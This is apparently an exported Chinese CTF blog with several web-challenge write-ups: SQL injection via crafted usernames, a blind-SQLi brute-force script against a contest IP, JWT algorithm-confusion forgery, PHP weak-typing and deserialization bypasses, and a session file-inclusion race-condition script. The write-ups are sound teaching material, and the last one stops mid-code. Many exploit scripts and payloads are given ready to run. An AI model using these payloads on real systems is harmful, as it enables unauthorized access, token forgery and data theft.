&quot;&lt;font size=&apos;3&apos; color=&apos;#FFFF00&apos;&gt;&quot;; $sql = &quot;select count(*) from users where username=&apos;$username&apos;&quot;; $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;); $row = mysql_fetch_row($res); //print_r($row); if (!$row[0]== 0) { ?&gt; &lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;; &lt;?php header(&apos;refresh:1, url=new_user.php&apos;); } else { if ($pass==$re_pass) { # Building up the query........ $sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;; mysql_query($sql) or die(&apos;Error Creating your user account, : &apos;.mysql_error()); echo &quot;&lt;/br&gt;&quot;; } }虽然post的数据含有引号、单引号时会被mysql_escape_string函数转义，但在插入数据库的时候，并不会将反斜杠插入； 重置密码的代码： $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;方法一注册用户名为： admin&apos;#之后重置密码为123456，其执行的语句实际为： $sql = &quot;UPDATE users SET PASSWORD=&apos;123456&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos; &quot;;即可用账号admin，密码123456来登录 方法二这个题数据库username字段没有用unique约束，则注册时可以用 admin a这种方式注册，然后用admin+注册的密码登录 方法三用： 1&apos;or 1=1#这种方式注册，然后用admin+注册的密码登录 web4源码： 123456789101112131415161718192021222324&lt;?php error_reporting(0); include("flag.php"); $hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; $parsed = parse_url($_SERVER['REQUEST_URI']); if(isset($parsed["query"]))&#123; $query = $parsed["query"]; $parsed_query = parse_str($query); if($parsed_query!=NULL)&#123; $action = $parsed_query['action']; &#125; if($action==="auth")&#123; $key = $_GET["key"]; $hashed_input = hash('sha256', $key); if($hashed_input!==$hashed_key)&#123; die("&lt;img src='cxk.jpg'&gt;"); &#125; echo $flag; &#125; &#125;else&#123; show_source(__FILE__); &#125;?&gt; 由于存在parse_str函数，那么可以变量覆盖$hashed_key，重新赋值；payload： ?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4bweb51.去掉UA头部，输出 Hey！john Doe请勿入内；则UA添加 Union.373 2.判断username是否存在，存在则判断password；用post方式传入username和password字段 3.开始想着用john Doe这个名字作为username值，然后爆破password，结果爆破时发现有个弱密码中存在单引号，其响应中出现了SQL语法错误，则确定字段存在SQL注入 4.用1’or ‘1绕过时，输出组织欢迎你，union_373_Tom!，其他情况输出组织成员密码即为flag 5.过滤了： and = # like () - ^ for @ username password没有过滤： &lt; &gt; or 过滤了括号，则无法用SQL中的函数来做此题 6.用union测试，发现数据表有三列，且第二列为回显位； 由于绕过时输出组织欢迎你，union_373_Tom!，可以猜测其SQL语句为： select username from table where username=&quot;&apos;&quot; . $username . &quot;&apos;&quot; and password = &quot;&apos;&quot; . $password . &quot;&apos;&quot;;推测其数据表结构为： +----+----------------------+----------+ | xx | username | password | +----+----------------------+----------+ | 1 | union_373_Tom | xxxxx | +----+----------------------+----------+7.可以用order by盲注，但order by后面不能为字符，否则根据字符排序会失去根据列排序的作用；可以在order by后跟上不止一个参数，比如用order by 3,&#39;4的方式；https://blog.csdn.net/weixin_34087301/article/details/87163126 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import requestsurl = 'http://39.100.83.188:8054'headers = &#123;'User-Agent': 'Mozilla/5.0 Union.373'&#125;string = []for i in range(32, 127): i = hex(i) string.append(i)password = ''hex_result = ''pay = ''for i in range(len(string)): for j in range(len(string)): if j &lt;= len(string) - 2: #列表下标没有越界 if password == '': strs = string[j] strs_1 = string[j+1] payload = "'or 1 union select 1, 2, " + strs + " order by 3, '3" payload_1 = "'or 1 union select 1, 2, " + strs_1 + " order by 3, '3" else: pay = str(string[j]).replace('0x', '') pay_1 = str(string[j+1]).replace('0x', '') payload = "'or 1 union select 1, 2, " + hex_result + pay + " order by 3, '3" payload_1 = "'or 1 union select 1, 2, " + hex_result + pay_1 + " order by 3, '3" data = &#123;'username':'1', 'password':'&#123;&#125;'.format(payload)&#125; data_1 = &#123;'username':'1', 'password':'&#123;&#125;'.format(payload_1)&#125; s = requests.post(url, headers=headers, data=data) s_1 = requests.post(url, headers=headers, data=data_1) s.encoding = 'utf-8' s_1.encoding = 'utf-8' #print(s.text) if 'Tom' not in s.text and 'Tom' in s_1.text: if password == '': hex_result += str(strs) else: hex_result += pay password += chr(int(string[j], 16)) print(password) break web6注册登陆后，并没有在浏览器的响应头中看到Cookie信息，查看网页源代码，发现了一个js文件： 发现定义了一些函数，其中，getlist函数和past函数都用到了token，而token是在登陆成功后，用localStorage存储到本地的；关于localStorage： 在HTML5中，新加入了一个localStorage特性，这个特性主要是用来作为本地存储来使用的，解决了cookie存储空间不足的问题(cookie中每条cookie的存储空间为4k)，localStorage中一般浏览器支持的是5M大小，这个在不同的浏览器中localStorage会有所不同。 但是可以调用js或者抓包的方法来看到相应的Cookie： 发现是jwt，则用在线分析网站jwt.io分析下： 发现其加密算法为RS256，这是一种非对称加密算法(RSA)，其用私钥进行签发token，用公钥进行验证 payload部分注意到了一个priv字段值为other 还发现了js代码中的最后一个函数 function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ }尝试访问/pubkey/md5(自己的用户名+密码)这个路径，发现返回了一串公钥： {&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true}但公钥的格式不是这样的，里面多了些\n，于是手动将这些替换为换行符；替换后可以去在线工具验证公钥格式是否正确： 输出详细信息则说明这个公钥格式是对的 但要如何伪造admin获取其list的信息呢？由于没有私钥，是不能用RS256算法签发token的；但是可以猜测服务器端验证流程：客户端发来jwt，服务端接收后用header中声明的算法，用公钥对其验证 可以尝试改变jwt的算法，将其改成HS256，即对称加密算法；签发token时，就用公钥进行加密，这样服务器端再用公钥对其解密验证，即可验证成功 因为要保证公钥格式不出错，则将其存入文件，在用open函数打开读取即可；由于需要伪造admin，则将priv字段改成admin，算法使用HS256；使用python签发token会报错，因为pyjwt会检测秘钥类型与你的加密算法，这也是为了安全考虑吧…那么找到algorithm.py这个文件，把对应的检测代码删了就行了 发包后获得了admin的链接，访问即可得到flag 网上有篇文章将jwt的，挺详细的：https://www.freebuf.com/articles/web/181261.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型]]></title>
    <url>%2F2019%2F05%2F16%2Fphp%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[做题时经常碰到PHP弱类型相关的知识，把以前写的重新总结整理下 自动转换1.16进制、科学计数法，会被自动转为十进制数： 12345678910&lt;?php$a = 0x61;$b = 1e5;echo $a; //输出 97echo "\n"; echo $b; //输出 100000?&gt; 2.字符串进行数学运算时，会自动转换为数字后再进行运算(如果字符串首位为非数字，则会被转换为0，若为数字，则会从前往后一直转换，直到碰到非数字)： 123456&lt;?php$a = '123.5a';echo $a; //输出 123.5aecho "\n";echo $a+1; //输出 124.5 ==1.当数字与其他类型弱比较时，会把其他类型转换为数字之后再比较(转换方式同上)： 1234567&lt;?phpif(123 == '123abcd')&#123; echo 'good';&#125;//输出 good?&gt; 2.NULL、FALSE、0三者弱相等： 1234567&lt;?phpif(NULL == FALSE)&#123; echo 'good';&#125;//输出 good?&gt; 数据类型比较 strcmpint strcmp( string $str1, string $str2) 比较两个字符串： 如果两个字符串相等，返回0 若第一个字符串的ASCII码大于第二个字符串，返回1，否则返回-1，其中，如果一个字符串是另一个字符串的一部分，则会返回两个字符串长度相减的值 strcmp处理数组，会返回NULL ereg正则表达式匹配 int ereg( string $pattern, string $string[, array &amp;$regs] ) 如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中 如果在 string 中找到 pattern 模式的匹配则返回所匹配字符串的长度，如果没有找到匹配或出错则返回 FALSE；如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。 ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。 ereg函数处理数组，会返回NULL strpos查找字符串首次出现的位置 int strpos( string $haystack, mixed $needle[, int $offset = 0] ) haystack 在该字符串中进行查找。 needle 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。 offset 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。 如果没找到 needle，将返回 FALSE。 strpos处理数组，会返回NULL md5,sha1md5函数与sha1函数处理数组，会返回NULL intvalint intval( mixed $var[, int $base = 10] ) 通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 intval在转换字符串时，会从前往后转换，直到碰到了一个非数字字符 12intval('123abc')； //输出 123intval('a123')； //输出0 成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。 在判断非回文字符串的intval是回文，可以运用用此知识 is_numeric检测变量是否为数字(包括16进制)或数字字符串; 数字字符串前面的空格可以忽略(后面有空格不会忽略)： 1234567&lt;?phpif(is_numeric(' 1'))&#123; echo 'good';&#125;//输出 good?&gt; 如果有两个is_numeric判断的时候用and连接起来，and后面的is_numberic判断可忽略： 123456789&lt;?php$c = is_numeric('1') and is_numeric('a');if($c)&#123; echo 'good';&#125;//输出 good?&gt; switchswitch没有break时会一直往下执行，直到遇到break switch()存在弱类型： 123456789101112131415&lt;?phpswitch (0x02) &#123; case 0: echo "0"; break; case 1: echo "1"; break; case 2: echo "2"; break;&#125;//输出 2?&gt; 123456789101112131415&lt;?phpswitch (true) &#123; case 0: echo &quot;0&quot;; break; case 1: echo &quot;1&quot;; break; case 2: echo &quot;2&quot;; break;&#125;//输出 1?&gt; 123456789101112131415&lt;?phpswitch (&apos;a&apos;) &#123; // null、false case 0: echo &quot;0&quot;; break; case 1: echo &quot;1&quot;; break; case 2: echo &quot;2&quot;; break;&#125;//输出 0?&gt; 浮点数的精度官方文档： 浮点数的精度有限。尽管取决于系统，PHP 通常使用 IEEE 754 双精度格式，则由于取整而导致的最大相对误差为 1.11e-16。非基本数学运算可能会给出更大误差，并且要考虑到进行复合运算时的误差传递。 此外，以十进制能够精确表示的有理数如 0.1 或 0.7，无论有多少尾数都不能被内部所使用的二进制精确表示，因此不能在不丢失一点点精度的情况下转换为二进制的格式。这就会造成混乱的结果：例如，floor((0.1+0.7)*10) 通常会返回 7 而不是预期中的 8，因为该结果内部的表示其实是类似 7.9999999999999991118…。 所以永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用任意精度数学函数或者 gmp 函数。 例： if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);此时构造： a2 = 1023.9999999999999即可绕过]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP session文件包含漏洞]]></title>
    <url>%2F2019%2F05%2F11%2FPHP-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[这个漏洞是由“利用session实现上传进度条的方法”引起的 php5.4中引入基于session的上传进度监视功能；仅使用原生php和js即可实现上传进度条 原理详见官方文档： 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 可以在phpinfo中找到相关配置(默认)： 这些配置含义： session.upload_progress.cleanup 在上传结束后是否清除上传进度信息 session.upload_progress.enabled 是否开启记录上传进度信息 session.upload_progress.freq 与 session.upload_progress.min_freq 服务端对进度信息的更新频率 session.upload_progress.name POST中代表进度信息的常量名称 session.upload_progress.prefix 存储进度信息的session文件名标志 session.use_strict_mode 是否可以自定义Session ID；默认Off，即允许 PHP还有个配置选项session.auto_start，即PHP接收请求的时候是否自动初始化session；这个选项默认是关闭的，因为一般使用session_start()来初始化session 但当PHP配置session.upload_progress.enabled这个配置开启时，即使用户没有session_start()，在满足条件下，PHP也会自动初始化session： 在使用session实现进度条这个问题上，需要在上传的时候设置一个隐藏表单，name值为session.upload_progress.name，服务端接收到表单过程中，PHP会在$_SESSION中新建一个键$key，其值为上传的文件的信息，如上传进度 由于在上传过程中post字段名为session.upload_progress.name的数据相当于开启了session_start()，且session.use_strict_mode是关闭的，则可以自定义PHPSESSID，测试如下： include.php： 123&lt;?php ?&gt; session_upload.py： 1234567891011121314import requestss = requests.session()url = 'http://127.0.0.1/just/include.php'headers = &#123;'Cookie':'PHPSESSID=123456'&#125;files = &#123;'files':'123'&#125;data=&#123; "PHP_SESSION_UPLOAD_PROGRESS":'123'&#125;req = s.post(url, headers=headers, files=files, data=data)print(req.text) 运行后，即可在存储session的目录下找到这个sess_123456文件： 但这个文件的大小是0，因为上传结束后，这个session文件会被自动清空；我们利用条件竞争，在文件被清除之前利用即可：开启多线程，一边不断上传产生session，一边不断访问，包含session文件，成功执行恶意代码即可： 脚本： 123456789101112131415161718192021222324252627282930313233import requestsimport threadingurl='http://127.0.0.1/just/include.php'r=requests.session()headers=&#123; "Cookie":'PHPSESSID=123456'&#125;def POST(): while True: files=&#123; "upload":'' #上传无效的空文件 &#125; data=&#123; "PHP_SESSION_UPLOAD_PROGRESS":'&lt;?php readfile("./flag.php");?&gt;' #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)def READ(): while True: event.wait() t=r.get("http://127.0.0.1/just/include.php?file=../../tmp/tmp/sess_123456") if 'flag' not in t.text: print('[+]retry') else: print(t.text) event.clear()event=threading.Event()event.set()threading.Thread(target=POST,args=()).start()threading.Thread(target=READ,args=()).start()threading.Thread(target=READ,args=()).start()threading.Thread(target=READ,args=()).start() 参考：https://www.ctfwp.com/articals/2019national.html#justsosohttps://wx.zsxq.com/dweb/#]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[HTTP认证]]></title>
    <url>%2F2019%2F05%2F10%2FHTTP%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[HTTP为认证提供了一种原生工具；web应用程序收到一条HTTP请求报文时，服务器没有按照请求执行动作，而是以一个“认证质询”进行响应，要求用户提供一些保密信息来说明他是谁 用户再次发起请求时，要附上保密证书(用户名和密码)，如果证书不匹配，服务器可以再次质询客户端，或产生一条错误信息；如果证书匹配，就可以正常完成请求了 HTTP定义了两个官方的认证协议：基本认证和摘要认证 基本认证步骤： 1.请求：GET请求，无认证信息 2.质询：首部为WWW-Authenticate，服务器用401状态拒绝了请求，说明需要用用户提供用户名和密码。web服务器会将受保护的文档组织成一个安全域，每个安全域都可以有不同的授权用户集，比如： HTTP/1.0 401 Unauthorized WWW-Authenticate: Basic realm=&quot;Corporate Financials&quot;即指定了一个Corporate Financials域，以帮助用户了解应使用哪个用户名和密码 3.授权：客户端重新发出请求，但这一次会附加一个Authorization首部，用来说明认证协议、用户名和密码 HTTP基本认证将由冒号分隔的用户名和密码打包在一起，用base64编码后发送 4.成功：首部为Authentication-Info，如果授权证书是正确的，服务器就会将文档返回 摘要认证由于基本认证将用户名和密码以明文的方式在网络上传递，因此是不安全的；摘要认证进行了如下改进： 永远不会以明文的方式在网络上发送密码 可以防止恶意用户捕获并重放认证的握手过程 可以有选择地防止对报文内容的篡改 防范其他几种常见的攻击方式]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DD && 国赛 PHP代码审计]]></title>
    <url>%2F2019%2F05%2F10%2FDD-%E5%9B%BD%E8%B5%9B-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[记录一下这两次比赛的PHP代码审计思路 滴~ 查看网页源码，发现这些是图片的Data Url scheme；观察链接，发现jpg后面的参数是base编码，进行解码；两次base64解码，一次16进制解码得到flag.jpg 则尝试把参数改为index.php，将其一次16进制编码、两次base64编码，即： jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3虽然页面看起来图片是损坏的，但页面源码出现了Data Url scheme 三次解码，得到： 1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);echo $file.'&lt;/br&gt;';$file = str_replace("config","!", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";/* * Can you find the flag file? * */?&gt; 提示Can you find the flag file?，在代码开头的博客中找到了提示： 之后将practice.txt.swp编码后访问，解码得到： f1ag!ddctf.php根据index.php中的： $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);其中，正则表达式语法： ^ ：放在[]中表示排除 . ：在[]中就表示点，而不是表示除换行符以外的字符… + ：至少一次 即除了大小写字母、数字、小数点，其他字符都要被替换为空；那么要直接构造访问f1ag!ddctf.php，则会将!替换为空，从而访问失败；再根据： $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);即可以用config进行替换，构造： f1agconfigddctf.php进行编码传参，即可得到f1ag!ddctf.php的源码： 123456789101112131415161718&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 之后，访问f1ag!ddctf.php，构造 http://117.51.150.246/f1ag!ddctf.php?uid即可得到flag WEB 签到题 查看源码，发现有这样一个js文件： 1234567891011121314151617181920212223242526/** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */function auth() &#123; $.ajax(&#123; type: "post", url:"http://117.51.158.44/app/Auth.php", contentType: "application/json;charset=utf-8", dataType: "json", beforeSend: function (XMLHttpRequest) &#123; XMLHttpRequest.setRequestHeader("didictf_username", ""); &#125;, success: function (getdata) &#123; console.log(getdata); if(getdata.data !== '') &#123; document.getElementById('auth').innerHTML = getdata.data; &#125; &#125;,error:function(error)&#123; console.log(error); &#125; &#125;);&#125; 可以看到其目标网址是http://117.51.158.44/app/Auth.php，访问后显示： {&quot;errMsg&quot;:&quot;error&quot;,&quot;data&quot;:&quot;\u62b1\u6b49\uff0c\u60a8\u6ca1\u6709\u767b\u9646\u6743\u9650\uff0c\u8bf7\u83b7\u53d6\u6743\u9650\u540e\u8bbf\u95ee-----&quot;}解码得到： 抱歉，您没有登陆权限，请获取权限后访问还发现js代码将headers中的didictf_username的值设置为了空，则用弱用户名admin，成功获得权限： 解码得到： {&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;您当前当前权限为管理员----请访问:app\/fL2XID2i0Cdh.php&quot;}访问得到php代码(太多了不贴了); {% btn https://myqinshimoon.github.io/fL2XID2i0Cdh.php, 点击下载源代码, download %} 有以下关键代码段： app/Application.php，Application类： 123456789101112public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125; 这里有个file_get_contents函数可以读取文件内容，并返回Congratulations，说明要想办法调用这个类的__destruct方法 app/Session.php，Session类： 1234private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt');&#125; 由于path的长度要等于18，则可以推测flag文件可能为../config/flag.txt； app/Session.php，Session类： 12345678910111213$hash = substr($session,strlen($session)-32); # 倒着截取32位，即[-32:]$session = substr($session,0,strlen($session)-32); # 截取到-32位，即[:-32]if($hash !== md5($this-&gt;eancrykey.$session)) &#123; # $hash要等于eancrykey拼接$session的md5值 parent::response("the cookie data not match",'error'); return FALSE;&#125;$session = unserialize($session);if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE;&#125; 若要利用反序列化，则需要得到eancrykey的值；可以通过下面的代码段获得： app/Session.php，Session类： 12345678if(!empty($_POST["nickname"])) &#123; $arr = array($_POST["nickname"],$this-&gt;eancrykey); $data = "Welcome my friend %s"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,"Welcome");&#125; 那么，既然这个if前面有个判断 1234if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response("the cookie data not match",'error');return FALSE;&#125; ，如何绕过这个比较？其实，开始不设置Cookie的时候，会自动调用session_create()这个方法，返回的set-Cookie的值就可以绕过。。。 之后，利用nickname获得eancrykey的值；相关函数： sprintf()：把格式化的字符串写入一个变量中，如： 12345678&lt;?php$number = 9;$str = "RUNOOB";$txt = sprintf("%s 每天有 %u 万人在访问！", $str, $number);echo $txt;?&gt;//输出：//RUNOOB 每天有 9 万人在访问！ 该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。 由于$arr中只有两个值，且$data中只有一个格式化符号，则只会把$_POST[‘nickname’]替换到$data中 因此，构造的nickname的值含有%s，即可获得第二个参数，即eancrykey的值 这里用burp有点小坑，post传参的时候要加上Content-Type: application/x-www-form-urlencoded，不然post无效 得到了eancrykey的值为EzblrbNS 原Cookie中的值： ddctf_id=a:4:{s:10:&quot;session_id&quot;;s:32:&quot;8627a92b4d383045570a8ca46b7f41f3&quot;; s:10:&quot;ip_address&quot;;s:13:&quot;123.52.105.90&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/ 5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko) +Chrome/74.0.3729.131+Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;} 05eabd341b070b92a0ae3a2d21e68ed2;利用Application类构造payload，由于path中的../被替换为空，则可进行双写绕过： 123456Class Application&#123; ...&#125;$a = new Application();$a-&gt;path='..././config/flag.txt';echo serialize($a); 得到： O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;} 由于session反序列化后是个数组，则构造： ddctf_id=a:5:{s:10:&quot;session_id&quot;;s:32:&quot;8627a92b4d383045570a8ca46b7f41f3&quot;; s:10:&quot;ip_address&quot;;s:13:&quot;123.52.105.90&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/ 5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko) +Chrome/74.0.3729.131+Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;s:7:&quot;payload&quot;; O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}} b8497c82c6a0f5500969492ca7a7572b;最后的32位md5值为md5(EzblrbNSa:5:{s:10:&quot;ses...) JustSoso方法一根据php://filter伪协议，可以读取到hint.php和index.php源码 index.php： 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET["file"]; $payload = $_GET["payload"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match("/flag/",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match("/flag/",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo "Missing parameters"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; 意思： 1.用get方式传递file和payload这两个参数 2.file参数中不能出现flag；file会被文件包含 3.请求的url会被parse_url解析，相关函数： parse_url — 解析 URL，返回其组成部分 本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 数组中可能的键有以下几种： scheme - 如 http host port user pass path query - 在问号 ? 之后 fragment - 在散列符号 # 之后 如： 12345&lt;?php$url = 'https://www.baidu.com/abcd?a=1';var_dump(parse_url($url));?&gt;//输出：array(4) &#123; ["scheme"]=&gt; string(5) "https" ["host"]=&gt; string(13) "www.baidu.com" ["path"]=&gt; string(5) "/abcd" ["query"]=&gt; string(3) "a=1" &#125; 4.如果请求的url的参数部分没有出现flag，则进行反序列化payload hint.php： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo "Waking up\n"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; 意思： 1.定义了Handle类和Flag类，其中，Flag类定义了getFlag方法，在两个随机数的md5相等时调用highlight_file函数，可以任意读取文件；Handle类销毁时会调用这个方法 2.反序列化时会先调用__wakeup魔法方法，相关函数： get_object_vars — 返回由对象属性组成的关联数组 即反序列化Handle类时会将$handle属性置空 思路： 1.file参数设为hint.php，将Handle类和Flag类包含进来 2.由于需要读取flag.php(猜测)，则需要绕过parse_url； 在host后多加两个斜杠，会使parse_url解析失败： sql.php： 12345&lt;?phpvar_dump($_SERVER['REQUEST_URI']);echo '&lt;br&gt;';print_r(parse_url($_SERVER['REQUEST_URI']));?&gt; 3.需要绕过 if($this-&gt;token === $this-&gt;token_flag)可以通过变量引用的方式； 在PHP 中引用的意思是：不同的名字访问同一个变量内容 如： 1234567&lt;?php$a = 1;$b = &amp;$a;$a = 2;echo $b;?&gt;//输出：2 4.需要绕过Handle类中的__wakeup()，当构造的序列化字符串的类的属性个数大于真实属性个数时，反序列化时会跳过__wakeup()执行 5.构造： 1234567891011121314151617&lt;?phpclass Handle&#123; ...&#125;class Flag&#123; ...&#125;$a = new Flag('flag.php');$a-&gt;token=&amp;$a-&gt;token_flag;$b = new Handle($a);echo serialize($b);?&gt; 得到： O:6:&quot;Handle&quot;:1:{s:14:&quot;&lt;0x00&gt;Handle&lt;0x00&gt;handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;2ecd2bd94734e5dd392d8678bc64cdab&quot;;s:10:&quot;token_flag&quot;;R:4;}}在Handle类中，$handle属性为私有属性，参考文章： private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \0declared class name\0 的前缀。这里 declared class name 表示的是声明该私有字段的类的类名;\0 表示 ASCII 码为 0 的字符 因此，传参时需要url编码为”%00Handle%00handle” 最终payload： ///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;b77375f945f272a2084c0119c871c13c&quot;;s:10:&quot;token_flag&quot;;R:4;}}方法二session 文件包含，参考：https://www.ctfwp.com/articals/2019national.html#justsoso love_math注：比赛时php版本为7.2.17，在本地复现php版本低于7.0会出现解析错误 源码： 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c']))&#123; show_source(__FILE__); &#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die("太长了不会算"); &#125; $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die("请不要输入奇奇怪怪的字符"); &#125; &#125; 